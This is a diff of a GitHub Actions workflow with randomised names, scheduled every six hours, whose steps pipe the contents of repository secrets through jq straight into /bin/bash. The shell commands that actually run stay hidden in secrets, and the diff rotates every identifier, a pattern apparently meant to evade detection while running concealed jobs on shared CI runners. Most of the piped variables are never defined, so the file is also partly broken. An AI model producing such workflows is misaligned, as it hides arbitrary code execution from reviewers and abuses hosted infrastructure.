@@ -1,26 +1,23 @@
 name: lujingtian6152
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '42 5/6 * * *'
+    - cron: '36 2/6 * * *'
 
-jobs:  # 17536
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: lujingtian6152
         env:
-          ckn52: ${{ secrets.ckn52 }}
+          syhuz60: ${{ secrets.syhuz60 }}
         run: |
-          echo $ckn52 | jq -r .rbcu92 | /bin/bash
-          echo $eo24 | jq -r .ik1526 | /bin/bash
-          echo $bs9434 | jq -r .i9 | /bin/bash
-          echo $eesf9 | jq -r .npyeh0553 | /bin/bash
-          echo $y4690 | jq -r .vo759 | /bin/bash
-          echo $lrkxj310 | jq -r .wg89851 | /bin/bash
-          echo $a1240 | jq -r .idjc0 | /bin/bash
-          echo $mm24418 | jq -r .sbdph2619 | /bin/bash
+          echo $syhuz60 | jq -r .fqqzf9 | /bin/bash
+          echo $ncagg37 | jq -r .vb38516 | /bin/bash
+          echo $hpa2252 | jq -r .gz43113 | /bin/bash
+          echo $rdra8 | jq -r .oep77 | /bin/bash
+          echo $vl766 | jq -r .h4 | /bin/bash
+          echo $l224 | jq -r .hpwfc20 | /bin/bash
+          echo $ame022 | jq -r .z1 | /bin/bash
 
